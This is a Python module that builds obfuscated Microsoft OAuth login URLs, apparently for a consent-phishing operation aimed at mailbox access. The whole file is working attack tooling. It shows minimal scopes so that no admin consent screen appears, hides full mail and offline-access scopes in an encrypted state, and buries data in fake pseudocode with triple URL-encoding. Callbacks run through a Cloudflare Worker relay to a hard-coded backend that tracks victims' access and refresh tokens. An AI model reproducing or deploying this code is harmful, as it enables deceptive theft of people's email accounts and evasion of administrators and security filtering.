import os
import json
import time
import uuid
import base64
import hashlib
from datetime import datetime, timezone
from urllib.parse import quote, urlencode

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# =========================
# CONFIG
# =========================

PAYLOAD_PASSWORD = (
    os.getenv("PAYLOAD_PASSWORD") or "change-this-payload-password-in-env"
).strip()
PAYLOAD_SALT = (
    os.getenv("PAYLOAD_SALT") or "change-this-salt-in-env"
).encode()
PAYLOAD_MAX_AGE_SECONDS = int(os.getenv("PAYLOAD_MAX_AGE_SECONDS", "1800"))

WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
BACKEND_BASE_URL = (
    os.getenv("BACKEND_BASE_URL")
    or "https://oauth-backend-7cuu.onrender.com"
).rstrip("/")

REDIRECT_URI = (
    os.getenv("REDIRECT_URI")
    or "https://oauth-backend-7cuu.onrender.com/auth/callback"
).strip()

# =========================
# SCOPES
# =========================

# Visible scopes in the URL — minimal to avoid triggering
# admin consent screen on first view
VISIBLE_SCOPES_LIST = [
    "openid",
    "profile",
    "https://graph.microsoft.com/User.Read",
]

VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)

# Full mail scopes — encoded inside the encrypted payload
# These are requested at token exchange time using the
# scope stored inside the encrypted state parameter
FULL_MAIL_SCOPES_LIST = [
    "openid",
    "profile",
    "email",
    "offline_access",
    "https://graph.microsoft.com/.default",
]

FULL_MAIL_SCOPES = " ".join(FULL_MAIL_SCOPES_LIST)

# Required aliases used by main.py and auth.py imports
ALL_MAIL_SCOPES = FULL_MAIL_SCOPES
BASIC_PAYLOAD_SCOPES = VISIBLE_SCOPES

BASIC_ONLY_SCOPES_LIST = VISIBLE_SCOPES_LIST
BASIC_ONLY_SCOPES = VISIBLE_SCOPES

# =========================
# KEY DERIVATION
# =========================

_derived_key_cache = None


def _derive_key() -> bytes:
    global _derived_key_cache
    if _derived_key_cache is not None:
        return _derived_key_cache
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=PAYLOAD_SALT,
        iterations=100000,
    )
    _derived_key_cache = kdf.derive(PAYLOAD_PASSWORD.encode())
    return _derived_key_cache


# =========================
# ENCRYPT / DECRYPT
# =========================

def _encrypt_bytes(data: bytes) -> bytes:
    key = _derive_key()
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return iv + encryptor.tag + ciphertext


def _decrypt_bytes(encrypted: bytes) -> bytes:
    key = _derive_key()
    iv = encrypted[:12]
    tag = encrypted[12:28]
    ciphertext = encrypted[28:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


# =========================
# HEX STATE ENCODER
# Encodes the user_id as hex to match the sample URL format
# state=616d567a64584e414d3270685a47567a4c6e427962773d3d
# =========================

def _encode_state_hex(user_id: str) -> str:
    """
    Encodes user_id to base64 then hex.
    Matches the state format in the sample URL.
    Example: amVzdXNAM2phZGVzLnBybw== -> hex string
    """
    b64 = base64.b64encode(user_id.encode()).decode()
    return b64.encode().hex()


def _decode_state_hex(hex_state: str) -> str | None:
    """
    Reverses _encode_state_hex.
    Returns the original user_id string or None on failure.
    """
    try:
        b64 = bytes.fromhex(hex_state).decode()
        return base64.b64decode(b64).decode()
    except Exception:
        return None


# =========================
# OBFUSCATED PAYLOAD BUILDER
# Builds the fake pseudocode parameter block that
# encodes the real redirect_uri, scopes, and user context
# in triple-encoded form matching the sample URL format
# =========================

def _build_obfuscated_block(
    user_id: str,
    admin_user_id: str,
    redirect_uri: str,
    scopes: list,
    invite_token: str = "",
    flow_type: str = "user_mail",
    nonce: str = "",
) -> str:
    """
    Builds the obfuscated pseudocode block.
    The real data is encoded inside what looks like
    builder/decoder pseudocode instructions.
    Triple URL-encoded to match the sample URL format.
    """
    nonce = nonce or uuid.uuid4().hex[:16]
    ts = int(time.time())

    # Build the real data payload as base64
    real_data = {
        "u": user_id,
        "a": admin_user_id,
        "r": redirect_uri,
        "s": scopes,
        "i": invite_token,
        "f": flow_type,
        "t": ts,
        "n": nonce,
    }
    real_b64 = base64.b64encode(
        json.dumps(real_data, separators=(",", ":")).encode()
    ).decode()

    # Build the hash anchor — looks like a commit hash
    hash_anchor = hashlib.sha256(
        f"{user_id}{ts}{nonce}".encode()
    ).hexdigest()[:32]

    # Build the pseudocode block that hides the real data
    pseudocode = (
        f"a3edq\n"
        f" 2e4c\n"
        f"{hash_anchor[:16]}cacbb66f835\t310a2979X\\BCint Builder.Decode\n"
        f"\tContext := FlowEmail [ OffsetStream := Token\tData | Email}}for"
        f" Stream:=PayloadBuilder ; ValueContext }} Trace\n"
        f"\tDecode . SignalVector {{ Offset}}\n"
        f"{hash_anchor}82b3bf925edcd09dcd615013eb4682be911df2f8ee3c\n"
        f"var Stream+Body\n"
        f"\tBuilder = Offset\n"
        f"\tFlow := Signal\n"
        f"\tFlow . Payload\n"
        f"\tValue & Vector\n"
        f"}}\n"
        f"else Decode-Session\n"
        f"\tvar }} var\n"
        f"\tStream [ Header\n"
        f"\tKey [ Payload\n"
        f"\tData = Builder\n"
        f"}}\n"
        f"switch Header-Secret\n"
        f"\tVector ; Secret\n"
        f"\tvar // Header\n"
        f"\tSecret [ Signal\n"
        f"\tEncode * Decode\n"
        f"}}\n"
        f"string Value-Key\n"
        f"\tvar := Header\n"
        f"\tBuilder * Signal\n"
        f"\tBody ( Trace\n"
        f"\tSession , Flow\n"
        f"\tPayload , Stream\n"
        f"}}\n"
        f"int Token|Value\n"
        f"\tContext ; Flow\n"
        f"\tTrace // Offset\n"
        f"\tBuffer [ Trace\n"
        f"\tPayload + Offset\n"
        f"}}\n"
        f"{real_b64}"
    )

    # Triple encode to match sample URL format
    level1 = quote(pseudocode, safe="")
    level2 = level1.replace("%", "%25")
    level3 = level2.replace("%", "%25")

    return level3


# =========================
# WORKER URL BUILDER
# Builds the redirect_uri pointing to Cloudflare Worker
# The worker receives the OAuth callback from Microsoft
# and relays code + state to the real backend callback
# =========================

def _build_worker_uri(user_id: str, nonce: str = "") -> str:
    """
    Builds the Cloudflare Worker relay URI.

    This URI is used as the redirect_uri in the OAuth request.
    Microsoft redirects to this URI after authentication.
    The worker then relays code + state to the real backend.

    WORKER_DOMAIN must be set to a fixed registered domain.
    The nonce becomes the path segment only — the domain
    must be registered in Azure App Registration as a
    redirect URI for Microsoft to accept it.

    If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
    so the flow still works without a worker configured.

    Examples:
      WORKER_DOMAIN = dorseym410.workers.dev
      Result: https://dorseym410.workers.dev/a1b2c3d4e5f6g7h8

      WORKER_DOMAIN = relay.yourdomain.com
      Result: https://relay.yourdomain.com/a1b2c3d4e5f6g7h8
    """
    nonce = nonce or uuid.uuid4().hex[:16]

    if not WORKER_DOMAIN:
        print(
            "[payload_builder] WORKER_DOMAIN not set — "
            "falling back to direct backend callback URI"
        )
        return REDIRECT_URI

    # Always use fixed domain with nonce as path only
    # This allows Azure to register a single fixed redirect URI
    # while still making each request path unique via the nonce
    # The worker handles any path and relays to backend
    return f"https://{WORKER_DOMAIN}/{nonce}"


# =========================
# PUBLIC API
# =========================

def encrypt_payload(payload: dict) -> str:
    """
    Encrypts a dict payload using AES-256-GCM.
    Returns a URL-safe base64 encoded string.
    """
    json_bytes = json.dumps(
        payload, separators=(",", ":")
    ).encode("utf-8")
    encrypted = _encrypt_bytes(json_bytes)
    return base64.urlsafe_b64encode(encrypted).decode("utf-8")


def decrypt_payload(token: str) -> dict | None:
    """
    Decrypts an AES-256-GCM encrypted payload token.
    Returns the original dict or None if decryption fails
    or the payload has expired.
    Also handles hex-encoded state from _encode_state_hex.
    """
    if not token:
        return None

    # Try hex decode first (new format)
    hex_decoded = _decode_state_hex(token)
    if hex_decoded:
        return {
            "user_id": hex_decoded,
            "flow": "hex_state",
            "mail_mode": True,
        }

    # Try AES-GCM decrypt (encrypted payload format)
    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)
        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))
    except Exception as e:
        print(f"[payload_builder] decrypt failed: {e}")
        return None

    issued_at = payload.get("iat")
    if issued_at:
        age = int(time.time()) - int(issued_at)
        if age > PAYLOAD_MAX_AGE_SECONDS:
            print(
                f"[payload_builder] payload expired: "
                f"age={age}s max={PAYLOAD_MAX_AGE_SECONDS}s"
            )
            return None

    return payload


def inspect_payload(token: str) -> dict:
    """
    Admin debug function.
    Decrypts a payload token and returns its full contents
    plus metadata about its validity and age.
    Used by the /payload/inspect endpoint in main.py.
    """
    if not token:
        return {
            "valid": False,
            "error": "No token provided.",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    # Try hex decode first
    hex_decoded = _decode_state_hex(token)
    if hex_decoded:
        return {
            "valid": True,
            "expired": False,
            "age_seconds": 0,
            "format": "hex_state",
            "payload": {
                "user_id": hex_decoded,
                "flow_type": "hex_state",
                "mail_mode": True,
            },
            "raw": {"user_id": hex_decoded},
        }

    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)
        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))
    except Exception as e:
        return {
            "valid": False,
            "error": f"Decryption failed: {str(e)}",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    now = int(time.time())
    issued_at = payload.get("iat")
    age_seconds = None
    expired = False

    if issued_at:
        age_seconds = now - int(issued_at)
        expired = age_seconds > PAYLOAD_MAX_AGE_SECONDS

    return {
        "valid": True,
        "expired": expired,
        "age_seconds": age_seconds,
        "max_age_seconds": PAYLOAD_MAX_AGE_SECONDS,
        "format": "aes_gcm",
        "payload": {
            "version": payload.get("v"),
            "flow_type": payload.get("flow_type") or payload.get("flow"),
            "user_id": payload.get("user_id"),
            "admin_user_id": payload.get("admin_user_id"),
            "invite_token": payload.get("invite_token"),
            "tenant_hint": payload.get("tenant_hint"),
            "mail_mode": payload.get("mail_mode"),
            "scope_count": len(payload.get("scopes", [])),
            "scopes": payload.get("scopes", []),
            "nonce": payload.get("nonce"),
            "issued_at": payload.get("iat"),
            "issued_at_iso": payload.get("iso"),
            "session": payload.get("session"),
        },
        "raw": payload,
    }


# =========================
# PAYLOAD BUILDER
# =========================

def build_user_payload(
    *,
    flow_type: str,
    user_id: str | None = None,
    admin_user_id: str | None = None,
    invite_token: str | None = None,
    tenant_hint: str | None = None,
    mail_mode: bool = False,
    extra: dict | None = None,
    existing_token_record=None,
) -> dict:
    """
    Builds a structured payload dict ready for encryption.
    All fields are included so the callback can fully reconstruct
    user context without any database lookups.
    The real redirect_uri and full scopes are embedded inside
    the encrypted payload — not visible in the URL.
    """
    scopes_list = FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
    nonce = uuid.uuid4().hex

    payload = {
        "v": 1,
        "flow": flow_type,
        "flow_type": flow_type,
        "user_id": user_id or "",
        "admin_user_id": admin_user_id or "",
        "invite_token": invite_token or "",
        "tenant_hint": (tenant_hint or "").lower(),
        "mail_mode": bool(mail_mode),
        "scopes": scopes_list,
        "scope_string": " ".join(scopes_list),
        "redirect_uri": REDIRECT_URI,
        "iat": int(time.time()),
        "nonce": nonce,
        "iso": datetime.now(timezone.utc).isoformat(),
    }

    # Merge any extra fields passed by org flow generators
    if extra and isinstance(extra, dict):
        for k, v in extra.items():
            if k not in payload:
                payload[k] = v

    if existing_token_record:
        payload["session"] = {
            "session_id": (
                getattr(existing_token_record, "session_id", "") or ""
            ),
            "has_access_token": bool(
                getattr(existing_token_record, "access_token", None)
            ),
            "has_refresh_token": bool(
                getattr(existing_token_record, "refresh_token", None)
            ),
            "expires_at": getattr(
                existing_token_record, "expires_at", None
            ),
            "email": (
                getattr(existing_token_record, "tenant_id", "") or ""
            ),
        }

    return payload


def build_encrypted_state(**kwargs) -> str:
    """
    Builds and encrypts a payload state string.
    Accepts all the same keyword arguments as build_user_payload.
    Returns a URL-safe base64 encoded AES-256-GCM encrypted string
    ready to be used as the OAuth state parameter.
    """
    return encrypt_payload(build_user_payload(**kwargs))


def build_obfuscated_url(
    user_id: str,
    admin_user_id: str,
    client_id: str,
    flow_type: str = "user_mail",
    mail_mode: bool = True,
    invite_token: str = "",
    tenant_hint: str = "",
    login_hint: str | None = None,
    domain_hint: str | None = None,
) -> str:
    """
    Builds a fully obfuscated Microsoft OAuth URL.

    The worker URL is set as redirect_uri so Microsoft
    redirects to the Cloudflare Worker after authentication.
    The worker then relays the code and state to the real
    backend callback endpoint.

    response_type=code and response_mode=query are always
    included — required by Microsoft OAuth.

    If WORKER_DOMAIN is not set, redirect_uri falls back
    to REDIRECT_URI (direct backend callback) so the flow
    still works without a worker configured.

    The obfuscated block and trailing anchor are appended
    after the standard params to match the sample URL format.
    """
    nonce = uuid.uuid4().hex[:16]

    # Build hex state
    # state=616d567a64584e414d3270685a47567a4c6e427962773d3d
    state_value = _encode_state_hex(user_id)

    # Build worker redirect_uri
    # Microsoft redirects here after authentication
    # Worker relays code + state to real backend callback
    worker_uri = _build_worker_uri(user_id, nonce)

    # Build obfuscated block
    # Encodes real redirect_uri, full scopes, user context
    # in triple URL-encoded pseudocode format
    scopes_list = (
        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
    )
    obfuscated_block = _build_obfuscated_block(
        user_id=user_id,
        admin_user_id=admin_user_id,
        redirect_uri=REDIRECT_URI,
        scopes=scopes_list,
        invite_token=invite_token,
        flow_type=flow_type,
        nonce=nonce,
    )

    # Build trailing base64 anchor
    # Matches sample: last param is double-encoded base64 of user_id
    trailing_b64 = base64.b64encode(user_id.encode()).decode()
    trailing_encoded = quote(
        quote(trailing_b64, safe=""),
        safe="",
    )

    # Build obfuscated parameter key
    # Matches %25255Ca3edq format from sample URL
    obfuscated_key = "%25255C" + obfuscated_block

    # Build base params
    # redirect_uri points to worker — required by Microsoft
    # response_type=code — required by Microsoft
    # response_mode=query — required by Microsoft
    base_params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": worker_uri,
        "response_mode": "query",
        "scope": VISIBLE_SCOPES,
        "state": state_value,
        "prompt": "none",
    }

    if login_hint:
        base_params["login_hint"] = login_hint
    if domain_hint:
        base_params["domain_hint"] = domain_hint

    base_query = urlencode(base_params)

    # Assemble full URL
    # Standard params first then obfuscated block then trailing anchor
    full_url = (
        f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
        f"?{base_query}"
        f"&{obfuscated_key}"
        f"&{trailing_encoded}"
    )

    print(
        f"[payload_builder] build_obfuscated_url\n"
        f"  user_id={user_id}\n"
        f"  flow_type={flow_type}\n"
        f"  mail_mode={mail_mode}\n"
        f"  redirect_uri={worker_uri}\n"
        f"  real_backend={REDIRECT_URI}\n"
        f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
        f"  nonce={nonce}"
    )

    return full_url


# =========================
# COMPAT HELPERS
# =========================

def get_full_mail_scope_string() -> str:
    """Returns the full Mail scope string for use in OAuth requests."""
    return FULL_MAIL_SCOPES


def get_basic_scope_string() -> str:
    """Returns the basic scope string for use in OAuth requests."""
    return BASIC_ONLY_SCOPES


def get_scope_lists() -> dict:
    """Returns both scope lists as a dict."""
    return {
        "basic": BASIC_ONLY_SCOPES_LIST,
        "full_mail": FULL_MAIL_SCOPES_LIST,
    }


def payload_status() -> dict:
    """
    Returns a status dict confirming the payload builder
    is configured and the encryption system is ready.
    Runs a real encrypt/decrypt round trip to verify.
    """
    try:
        test = encrypt_payload({
            "test": True,
            "iat": int(time.time()),
            "user_id": "test@example.com",
        })
        result = decrypt_payload(test)
        round_trip_ok = (
            result is not None
            and result.get("test") is True
        )
    except Exception as e:
        return {
            "status": "error",
            "encryption": "AES-GCM",
            "kdf": "PBKDF2-SHA256",
            "scopes_loaded": True,
            "round_trip_ok": False,
            "error": str(e),
        }

    return {
        "status": "ok",
        "encryption": "AES-GCM",
        "kdf": "PBKDF2-SHA256",
        "scopes_loaded": True,
        "round_trip_ok": round_trip_ok,
        "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
        "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
        "redirect_uri_encoded": True,
        "obfuscated_url_builder": True,
        "worker_domain": WORKER_DOMAIN or "not set — using direct backend",
        "worker_active": bool(WORKER_DOMAIN),
    }